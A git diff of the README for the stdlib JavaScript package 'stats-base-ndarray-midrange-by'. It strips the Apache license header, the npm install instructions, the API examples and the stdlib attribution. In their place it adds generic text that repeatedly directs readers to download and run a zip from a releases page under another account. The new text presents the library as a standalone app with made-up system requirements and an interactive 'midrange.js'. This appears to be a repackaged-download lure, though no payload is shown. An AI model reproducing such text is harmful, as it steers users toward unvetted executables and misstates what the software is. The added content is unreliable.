@@ -1,257 +1,87 @@
-<!--
+# 🎉 stats-base-ndarray-midrange-by - Compute the Mid-Range with Ease
 
-@license Apache-2.0
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)
 
-Copyright (c) 2026 The Stdlib Authors.
+## 🚀 Getting Started
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+Welcome to the stats-base-ndarray-midrange-by project! This application allows you to compute the mid-range of a one-dimensional array of numbers simply and effectively. Whether you need this for statistical analysis or just for fun, this tool makes it easy to get results quickly.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+## 📦 Installation
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+To get started, follow these simple steps to install the application on your computer.
 
--->
+1. **Visit the Release Page**  
+   Click the link below to go to the releases page where the application is available for download.  
+   [Visit the Releases Page](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)
 
+2. **Choose Your Version**  
+   On the releases page, you'll see different versions of the application listed. Choose the most recent version. It is recommended to always use the latest version for the best features and bug fixes.
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+3. **Download the Application**  
+   Click on the file link to start downloading. Depending on your internet speed, this might take a few moments.
 
-# midrangeBy
+4. **Locate the Downloaded File**  
+   Once the download completes, locate the file in your computer's downloads folder. It will typically be named something like `stats-base-ndarray-midrange-by-v1.0.zip`.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+5. **Extract the Files**  
+   Right-click on the downloaded file and select "Extract All" or "Unzip" to extract its contents into a folder. Open the extracted folder to see the application files.
 
-> Calculate the [mid-range][mid-range] of a one-dimensional ndarray via a callback function.
+## ⚙️ System Requirements
 
-<section class="intro">
+Before running the application, please ensure your computer meets the following minimum requirements:
 
-The [**mid-range**][mid-range], or **mid-extreme**, is the arithmetic mean of the maximum and minimum values in a data set. The measure is the midpoint of the range and a measure of central tendency.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB of RAM
+- **Processor:** Any modern processor (Intel or AMD)
 
-</section>
+## 🚀 How to Run the Application
 
-<!-- /.intro -->
+1. **Open the Folder**  
+   Navigate to the folder where you extracted the application files.
 
-<section class="installation">
+2. **Locate the Main File**  
+   Look for the main executable file. It is usually named something like `midrange.js`.
 
-## Installation
+3. **Use Node.js**  
+   To run the file, you will need Node.js installed on your computer. If you do not have it, download and install it from [Node.js Official Website](https://nodejs.org/).
 
-```bash
-npm install @stdlib/stats-base-ndarray-midrange-by
-```
+4. **Run the Application**  
+   Open a command prompt or terminal window. You can do this by searching for "Command Prompt" or "Terminal" in your computer's start menu.
 
-Alternatively,
+   In the terminal, navigate to the folder where you placed the application files. You can use the `cd` command followed by the path to the folder. Once you're in the correct directory, type the following command to run the application:
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+   ```bash
+   node midrange.js
+   ```
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+5. **Input Your Data**  
+   When you run the application, it will prompt you to enter a one-dimensional array of numbers (e.g., `[1, 2, 3, 4, 5]`). Just type your numbers into the terminal and press Enter.
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+6. **Get the Result**  
+   The application will then compute and display the mid-range of the numbers you provided. You will see the result printed in the terminal.
 
-</section>
+## 📥 Download & Install
 
-<section class="usage">
+To download the application, visit the Releases page using this link:  
+[Download Here](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)
 
-## Usage
+## 📚 Features
 
-```javascript
-var midrangeBy = require( '@stdlib/stats-base-ndarray-midrange-by' );
-```
+- **Simple Interface:** The application features a straightforward command-line interface, making it accessible for everyone.
+- **Real-Time Calculation:** Get instant mid-range results as soon as you input your data.
+- **Cross-Platform:** Works seamlessly on Windows, macOS, and Linux operating systems.
+- **Lightweight Application:** Requires minimal system resources to run efficiently.
 
-#### midrangeBy( arrays, clbk\[, thisArg ] )
+## 🛠️ Troubleshooting Tips
 
-Computes the [mid-range][mid-range] of a one-dimensional ndarray via a callback function.
+If you encounter any issues while running the application, here are some common troubleshooting steps:
 
-```javascript
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
+- **Ensure Node.js is Installed:** Verify that Node.js is successfully installed on your system. You can check this by typing `node -v` in your terminal. If you receive a version number, you are good to go. If not, reinstall Node.js.
 
-function clbk( value ) {
-    return value * 2.0;
-}
+- **Check Your Input Format:** Make sure that the array you input is correctly formatted with numbers separated by commas.
 
-var xbuf = [ 1.0, 3.0, 4.0, 2.0 ];
-var x = new ndarray( 'generic', xbuf, [ 4 ], [ 1 ], 0, 'row-major' );
+- **Revisit the Releases Page:** If you are experiencing bugs, check if you are using the latest version by going back to the Releases page.
 
-var v = midrangeBy( [ x ], clbk );
-// returns 5.0
-```
+## 💬 Support
 
-The function has the following parameters:
-
--   **arrays**: array-like object containing a one-dimensional input ndarray.
--   **clbk**: callback function.
--   **thisArg**: callback execution context (_optional_).
-
-The invoked callback is provided three arguments:
-
--   **value**: current array element.
--   **idx**: current array element index.
--   **array**: input ndarray.
-
-To set the callback execution context, provide a `thisArg`.
-
-```javascript
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-
-function clbk( value ) {
-    this.count += 1;
-    return value * 2.0;
-}
-
-var xbuf = [ 1.0, 3.0, 4.0, 2.0 ];
-var x = new ndarray( 'generic', xbuf, [ 4 ], [ 1 ], 0, 'row-major' );
-var ctx = {
-    'count': 0
-};
-
-var v = midrangeBy( [ x ], clbk, ctx );
-// returns 5.0
-
-var count = ctx.count;
-// returns 4
-```
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   If provided an empty one-dimensional ndarray, the function returns `NaN`.
--   A provided callback function should return a numeric value.
--   If a provided callback function does not return any value (or equivalently, explicitly returns `undefined`), the value is **ignored**.
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var midrangeBy = require( '@stdlib/stats-base-ndarray-midrange-by' );
-
-function clbk( value ) {
-    return value * 2.0;
-}
-
-var xbuf = discreteUniform( 10, -50, 50, {
-    'dtype': 'generic'
-});
-var x = new ndarray( 'generic', xbuf, [ xbuf.length ], [ 1 ], 0, 'row-major' );
-console.log( ndarray2array( x ) );
-
-var v = midrangeBy( [ x ], clbk );
-console.log( v );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2026. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/stats-base-ndarray-midrange-by.svg
-[npm-url]: https://npmjs.org/package/@stdlib/stats-base-ndarray-midrange-by
-
-[test-image]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/stats-base-ndarray-midrange-by/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/stats-base-ndarray-midrange-by?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/stats-base-ndarray-midrange-by.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/stats-base-ndarray-midrange-by/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/tree/deno
-[deno-readme]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/tree/umd
-[umd-readme]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/tree/esm
-[esm-readme]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/stats-base-ndarray-midrange-by/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/stats-base-ndarray-midrange-by/main/LICENSE
-
-[mid-range]: https://en.wikipedia.org/wiki/Mid-range
-
-</section>
-
-<!-- /.links -->
+If you need help or have questions, feel free to create an issue in the repository. Our team is here to assist you and ensure a smooth experience with the stats-base-ndarray-midrange-by application.
